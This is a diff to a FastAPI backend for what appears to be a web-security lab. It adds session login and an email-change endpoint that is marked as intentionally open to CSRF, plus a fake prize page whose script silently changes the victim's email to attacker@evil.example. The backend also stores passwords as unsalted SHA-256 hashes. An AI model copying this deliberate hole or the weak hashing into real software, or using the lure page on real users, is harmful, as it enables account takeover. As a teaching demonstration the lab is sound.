@@ -1,8 +1,10 @@
 import hashlib
 import re
+import secrets
 
-from fastapi import FastAPI, HTTPException
+from fastapi import Depends, FastAPI, HTTPException, Request, Response
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import HTMLResponse
 from pydantic import BaseModel, Field
 
 app = FastAPI(title="LAB5 Backend")
@@ -39,6 +41,15 @@ class RegisterRequest(BaseModel):
     password: str = Field(min_length=6, max_length=128)
 
 
+class LoginRequest(BaseModel):
+    username: str
+    password: str
+
+
+class ChangeEmailRequest(BaseModel):
+    email: str
+
+
 class UserOut(BaseModel):
     id: int
     username: str
@@ -62,8 +73,24 @@ PRODUCTS: list[Product] = [
 
 PAYMENTS: list[Payment] = []
 USERS: list[User] = []
+SESSIONS: dict[str, int] = {}
 
 EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
+
+
+def _hash_password(password: str) -> str:
+    return hashlib.sha256(password.encode()).hexdigest()
+
+
+def current_user(request: Request) -> User:
+    session_id = request.cookies.get("session_id")
+    if not session_id or session_id not in SESSIONS:
+        raise HTTPException(status_code=401, detail="Not authenticated")
+    user_id = SESSIONS[session_id]
+    user = next((u for u in USERS if u.id == user_id), None)
+    if user is None:
+        raise HTTPException(status_code=401, detail="Session invalid")
+    return user
 
 
 @app.get("/products", response_model=list[Product])
@@ -95,7 +122,7 @@ def register(req: RegisterRequest) -> UserOut:
         id=len(USERS) + 1,
         username=req.username,
         email=req.email,
-        password_hash=hashlib.sha256(req.password.encode()).hexdigest(),
+        password_hash=_hash_password(req.password),
     )
     USERS.append(user)
     return UserOut(id=user.id, username=user.username, email=user.email)
@@ -104,6 +131,85 @@ def register(req: RegisterRequest) -> UserOut:
 @app.get("/users", response_model=list[UserOut])
 def list_users() -> list[UserOut]:
     return [UserOut(id=u.id, username=u.username, email=u.email) for u in USERS]
+
+
+@app.post("/login", response_model=UserOut)
+def login(req: LoginRequest, response: Response) -> UserOut:
+    user = next((u for u in USERS if u.username == req.username), None)
+    if user is None or user.password_hash != _hash_password(req.password):
+        raise HTTPException(status_code=401, detail="Invalid credentials")
+    session_id = secrets.token_urlsafe(32)
+    SESSIONS[session_id] = user.id
+    response.set_cookie(
+        key="session_id",
+        value=session_id,
+        httponly=True,
+        samesite="lax",
+        max_age=3600,
+    )
+    return UserOut(id=user.id, username=user.username, email=user.email)
+
+
+@app.post("/logout")
+def logout(request: Request, response: Response) -> dict[str, bool]:
+    session_id = request.cookies.get("session_id")
+    if session_id:
+        SESSIONS.pop(session_id, None)
+    response.delete_cookie("session_id")
+    return {"ok": True}
+
+
+@app.get("/me", response_model=UserOut)
+def me(user: User = Depends(current_user)) -> UserOut:
+    return UserOut(id=user.id, username=user.username, email=user.email)
+
+
+@app.post("/me/email", response_model=UserOut)
+def change_email(
+    req: ChangeEmailRequest,
+    user: User = Depends(current_user),
+) -> UserOut:
+    """INTENCJONALNIE PODATNE NA CSRF.
+
+    Endpoint zmienia stan konta bazując wyłącznie na cookie session_id,
+    nie wymaga żadnego tokenu CSRF, nie weryfikuje nagłówka Origin/Referer.
+    Każde żądanie z tego samego pochodzenia (np. spreparowana strona
+    serwowana przez ten sam backend albo XSS w aplikacji) może zmienić email.
+    """
+    user.email = req.email
+    return UserOut(id=user.id, username=user.username, email=user.email)
+
+
+@app.get("/csrf-demo", response_class=HTMLResponse)
+def csrf_demo() -> str:
+    """Strona "atakującego" - po wejściu automatycznie zmienia email zalogowanego usera.
+
+    W realnym ataku ten HTML byłby hostowany na innej domenie, a atakujący
+    polegałby na: (a) złej konfiguracji CORS, (b) braku flagi SameSite na
+    cookie sesyjnym, lub (c) na XSS dającym dostęp do same-origin zapytań.
+    Tu serwujemy ją z tego samego backendu, by ominąć trudności
+    konfiguracyjne lokalnego HTTPS - vulnerability (brak tokenu CSRF) jest
+    ta sama.
+    """
+    attacker_email = "attacker@evil.example"
+    return f"""<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Gratulacje!</title></head>
+<body data-csrf-status="pending">
+    <h1>Wygrałeś nagrodę!</h1>
+    <p>Kliknij <a href="#">tutaj</a> aby ją odebrać...</p>
+    <script>
+    fetch('/me/email', {{
+        method: 'POST',
+        credentials: 'include',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{email: '{attacker_email}'}})
+    }}).then(r => {{
+        document.body.dataset.csrfStatus = String(r.status);
+    }}).catch(e => {{
+        document.body.dataset.csrfStatus = 'network-error';
+    }});
+    </script>
+</body></html>"""
 
 
 def main() -> None:
